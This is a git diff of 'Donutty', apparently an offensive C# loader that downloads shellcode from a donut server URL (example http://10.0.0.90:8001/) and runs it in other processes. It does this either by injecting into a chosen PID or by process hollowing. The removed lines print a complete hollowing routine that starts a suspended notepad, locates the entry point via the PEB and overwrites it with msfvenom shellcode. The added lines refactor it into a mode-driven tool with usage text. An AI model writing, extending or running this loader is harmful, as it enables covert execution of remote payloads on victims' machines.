@@ -15,69 +15,6 @@ namespace Donutty
 
     class Program
     {
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
-        struct STARTUPINFO
-        {
-            public Int32 cb;
-            public IntPtr lpReserved;
-            public IntPtr lpDesktop;
-            public IntPtr lpTitle;
-            public Int32 dwX;
-            public Int32 dwY;
-            public Int32 dwXSize;
-            public Int32 dwYSize;
-            public Int32 dwXCountChars;
-            public Int32 dwYCountChars;
-            public Int32 dwFillAttribute;
-            public Int32 dwFlags;
-            public Int16 wShowWindow;
-            public Int16 cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public int dwProcessId;
-            public int dwThreadId;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct PROCESS_BASIC_INFORMATION
-        {
-            public IntPtr Reserved1;
-            public IntPtr PebAddress;
-            public IntPtr Reserved2;
-            public IntPtr Reserved3;
-            public IntPtr UniquePid;
-            public IntPtr MoreReserved;
-        }
-
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
-        static extern bool CreateProcess(
-           string lpApplicationName,
-           string lpCommandLine,
-           IntPtr lpProcessAttributes,
-           IntPtr lpThreadAttributes,
-           bool bInheritHandles,
-           uint dwCreationFlags,
-           IntPtr lpEnvironment,
-           string lpCurrentDirectory,
-           [In] ref STARTUPINFO lpStartupInfo,
-           out PROCESS_INFORMATION lpProcessInformation);
-
-        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
-        private static extern int ZwQueryInformationProcess(
-            IntPtr hProcess,
-            int procInformationClass,
-            ref PROCESS_BASIC_INFORMATION procInformation,
-            uint ProcInfoLen,
-            ref uint retlen);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool ReadProcessMemory(
@@ -104,7 +41,20 @@ namespace Donutty
 
         static void help()
         {
-            Console.WriteLine("[-] Usage: Donutty.exe /f:<filename> /params:\"args here\" /a:<archnumber> /url:\"http://url\" /pid:<pid>");
+            string help = @"
+[-] Usage: Donutty.exe /m:mode /f:<filename> /p:""args here"" /a:<archnumber> /url:""http://url\"" /pid:<pid>
+    
+    Mandatory Keys
+    /m => Specifies the injection type. 1 = Process Injection, 2 = Process Hollowing
+    /f => Specifies the executable filename from the server to inject with
+    /url => URL of donut server endpoint. Ex: /url:""http://10.0.0.90:8001/""
+
+    /p => Specifies parameters or CLI args to pass. Ex: /p:""-c whoami""
+    /a => Specifies architecture. 1 = x86, 2 = amd64 (default), 3 = x86+amd64
+    /pid => PID of process to inject into. Necessary for Process Injection (/m:1)
+    /b => Binary to hollow and inject into. Necessary for Process Hollowing (/m:2)
+";
+            Console.WriteLine(help);
         }
 
         static void inject(byte[] buf, int PID)
@@ -118,36 +68,18 @@ namespace Donutty
 
 
         }
-            static void hollow(byte[] buf)
+            static void hollow(string binary, byte[] shellcode)
         {
 
-            STARTUPINFO si = new STARTUPINFO();
-            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-            bool res = CreateProcess(null, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi); //Suspended process
-            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
-
-            uint tmp = 0;
-            IntPtr hProcess = pi.hProcess; //grab the handle to process
-            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp); //query info. 6 because the struct (bi) is 6 IntPtrs. 0 because we want PEB. This writes to bi
-            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10); //now bi has PEB addr, we can find image base by the value of the addr 10 bytes adjacent
-
-            byte[] addrBuf = new byte[IntPtr.Size];
-            IntPtr nRead = IntPtr.Zero;
-            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead); //Read first 8 bytes (address of the base image), save data to the addrBuf. This is the value of the 0x10 thing that has the base addr of the executable in memory.
-
-            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0)); //Converting that 8 byte address to a 64 bit number, then turn to pointer
-            byte[] data = new byte[0x200];
-            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead); //Read the first 0x200 bytes of the executable in memory
-
-            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C); //read the e_lfanew to grab the offset between the PE header and executable memory base
-            uint opthdr = e_lfanew_offset + 0x28; //Add 0x28 to that offset to get the RVA address
-            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr); //value of the RVA (an offset)
-            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase); //Add the RVA value (offset) to the base address of the executable memory
-
-            //msfvenom
-
-            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
-            ResumeThread(pi.hThread);
+            ProcHollowing a = new ProcHollowing();
+            ProcHollowing.PROCESS_INFORMATION pinf = ProcHollowing.StartProcess(binary);
+            a.CreateSection((uint)shellcode.Length);
+            a.FindEntry(pinf.hProcess);
+            a.SetLocalSection((uint)shellcode.Length);
+            a.CopyShellcode(shellcode);
+            a.MapAndStart(pinf);
+            ProcHollowing.CloseHandle(pinf.hThread);
+            ProcHollowing.CloseHandle(pinf.hProcess);
 
         }
         static void Main(string[] args)
@@ -173,22 +105,77 @@ namespace Donutty
                 help();
                 return;
             }
-            string file = arguments["/f"];
-            string parameters = arguments["/params"];
-            string arch = arguments["/a"];
+            else if (!arguments.ContainsKey("/m"))
+            {
+                Console.WriteLine("[-] Need to specify an injection type!");
+            }
+            else if (!arguments.ContainsKey("/f"))
+            {
+                Console.WriteLine("[-] Need to specify a file to inject with!");
+            }
+            else if (!arguments.ContainsKey("/url"))
+            {
+                Console.WriteLine("[-] Need to specify the donut server url!");
+            }
+            else if (arguments.ContainsKey("/m") && arguments["/m"] == "1" && (!arguments.ContainsKey("/pid")))
+            {
+                Console.WriteLine("[-] Need to specify a PID to inject to for Process Injection!");
+            }
+            else if (arguments.ContainsKey("/m") && arguments["/m"] == "2" && (!arguments.ContainsKey("/b")))
+            {
+                Console.WriteLine("[-] Need to specify a path to the binary to inject to for Process Hollowing!");
+            }
+            string fileName = arguments["/f"];
+            string mode = arguments["/m"];
             string url = arguments["/url"];
-            int PID = Int32.Parse(arguments["/pid"]);
-            Console.WriteLine(args[2]);
-            Console.WriteLine(arguments["/params"]);
+            string parameters;
+            string architecture;
+            int PID;
+            string binary;
+            try
+            {
+                parameters = arguments["/p"];
+            }
+            catch
+            {
+                parameters = "";
+            }
+            
+            try
+            {
+                architecture = arguments["/a"];
+            }
+            catch
+            {
+                architecture = "2";
+            }
+
+            try
+            {
+                PID = Int32.Parse(arguments["/pid"]); ;
+            }
+            catch
+            {
+                PID = 0;
+            }
+
+            try
+            {
+                binary = arguments["/b"];
+            }
+            catch
+            {
+                binary = "";
+            }
             #region Web request
 
             WebClient wc = new WebClient();
             
             object tmp = new
             {
-                file = arguments["/f"],
-                arch = arguments["/a"],
-                args = arguments["/params"],
+                file = fileName,
+                arch = architecture,
+                args = parameters,
             };
             string json = JsonConvert.SerializeObject(tmp);
             
@@ -205,12 +192,19 @@ namespace Donutty
             {
                 var result = streamReader.ReadToEnd();
             }
-            
-            //[] buf = wc.DownloadData("http://10.0.0.90:8001/loader.bin");
+            #endregion
+
             byte[] memBuf = wc.DownloadData(url);
             byte[] buf = memBuf;
-            inject(buf, PID);
-            #endregion
+            if (mode.Equals("1"))
+            {
+                inject(buf, PID);
+            }
+            else if (mode.Equals("2"))
+            {
+                hollow(binary, buf);
+            }
+
             
         }
     }
